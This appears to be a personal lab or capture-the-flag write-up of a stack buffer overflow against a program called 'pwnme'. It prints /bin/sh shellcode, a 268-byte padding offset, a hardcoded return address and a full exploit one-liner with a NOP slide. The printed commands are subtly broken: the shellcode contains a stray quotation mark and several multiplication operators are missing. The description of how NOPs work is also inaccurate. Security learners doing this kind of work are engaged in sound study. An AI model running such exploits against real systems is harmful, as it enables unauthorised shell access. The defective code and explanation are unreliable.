Since there are no write ups yet, I guess I'll have a go.

Looking at the original problem, it was obvious that any previous techniques would not work. There was no function that would output a shell, therefore we would need to borrow someone else's shellcode. I did a quick google search and found

Shellcode:"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80".

This is the equivalent of the bin/sh that were being executed before but instead in hex characters.

Cool, so the shellcode would bring up our shell, but we needed to know where to put it.

Bringing up GDB I tried this as my input, since the character buffer was 256, I tried 264 first with $(python -c 'print "A" 264 + "BBBB"')
But i didn't get a segmentation fault. It was only when I did $(python -c 'print "A" 268 + "BBBB"') that I override the EBP and EIP registers.

Great now I had my padding = $(python -c 'print "A" * 268')

Creating a breakpoint in GDB right before the CMP function, I made sure the EBP and EIP registers were both overridden.

Next, because I have control of the EIP register now, as I can override it - I needed a place to execute my shellcode. I chose the ESP register which had the value of 0xffffd5f0. This was the value at the breakpoint I used so why not just use it.

New EIP Pointer = "\xf0\xd5\xff\xff"

Lastly, because the stack is dynamic, if I got the placement of my ESP register ( aka where I wanted to execute the shell code), I put a NOP slide which is simply $(python -c 'print "\x90" * 100'). Since the stack won't read \x90 values which equal NOP, it will continue up the stack until it reaches my shellcode.

To put it all together : ./pwnme $(python -c 'print "A" 268 + "\xf0\xd5\xff\xff"+ "\x90" 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
